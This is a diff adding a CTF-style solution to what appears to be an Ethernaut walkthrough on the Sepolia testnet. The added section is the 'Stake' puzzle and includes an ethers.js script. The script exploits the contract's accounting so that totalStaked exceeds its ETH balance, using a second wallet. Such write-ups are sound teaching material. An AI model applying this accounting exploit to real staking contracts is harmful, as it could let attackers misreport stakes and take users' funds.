@@ -582,3 +582,59 @@ let wallet = new _ethers.Contract(walletAddr, walletABI, signer)
 
 - registerTreasury tx: [0x18976b2a0ebc2b687955d30b17ebf1e24899d9b1050742883a6603032867dfbc](https://sepolia.etherscan.io/tx/0x18976b2a0ebc2b687955d30b17ebf1e24899d9b1050742883a6603032867dfbc)
 - claimLeadership tx: [0x10f7e802c3cbf425191d46fb967a493caf19d6c2145a33c82439fe1fc613413f](https://sepolia.etherscan.io/tx/0x10f7e802c3cbf425191d46fb967a493caf19d6c2145a33c82439fe1fc613413f)
+
+## Problem 31: Stake
+
+- Stake contract: [0x6087E454383ca0e21E81095D89864E4D9B5A175D](https://sepolia.etherscan.io/address/0x6087E454383ca0e21E81095D89864E4D9B5A175D)
+- dummy WETH contract: [0xCd8AF4A0F29cF7966C051542905F66F5dca9052f](https://sepolia.etherscan.io/address/0xCd8AF4A0F29cF7966C051542905F66F5dca9052f)
+
+**Requirements**
+
+1. The `Stake` contract's ETH balance has to be greater than 0.
+2. `totalStaked` must be greater than the `Stake` contract's ETH balance.
+3. You must be a staker.
+4. Your staked balance must be 0.
+
+Combining 1 & 2 tgt: totalStaked > Stake ETH bal > 0
+
+**Solution**
+
+```ts
+let provider = new _ethers.providers.Web3Provider(window.ethereum);
+let signer = provider.getSigner();
+
+let erc20abi = [
+  "function totalSupply() view returns (uint256)",
+  "function allowance(address, address) view returns (uint256)",
+  "function approve(address, uint256) returns (bool)",
+  "function balanceOf(address) view returns (uint256)",
+  "function transferFrom(address, address, uint256) returns (bool)",
+]
+
+let erc20Addr = "0xCd8AF4A0F29cF7966C051542905F66F5dca9052f";
+let erc20 = new _ethers.Contract(erc20Addr, erc20abi, signer);
+
+let stakeWei = toWei('0.00101');
+
+await erc20.approve(contract.address, stakeWei);
+await contract.StakeWETH(stakeWei);
+await contract.Unstake(stakeWei);
+
+let signer2 = new _ethers.Wallet(`another private key`, provider)
+let erc20Signer2 = new _ethers.Contract(erc20Addr, erc20abi, signer2);
+
+let stakeAbi = [
+  "function totalStaked() view returns (uint256)",
+  "function StakeWETH(uint256) returns (bool)",
+  "function StakeETH() payable",
+]
+let contractSigner2 = new _ethers.Contract(contract.address, stakeAbi, signer2);
+
+await erc20Signer2.approve(contract.address, stakeWei);
+await contractSigner2.StakeWETH(stakeWei);
+await contractSigner2.StakeETH({ value: stakeWei });
+
+// Submit the contract at this point
+```
+
+Instead of creating a smart contract as a staker that reverts in its `receive()` function, we use another EOA to satisfy the passing requirements of this puzzle.
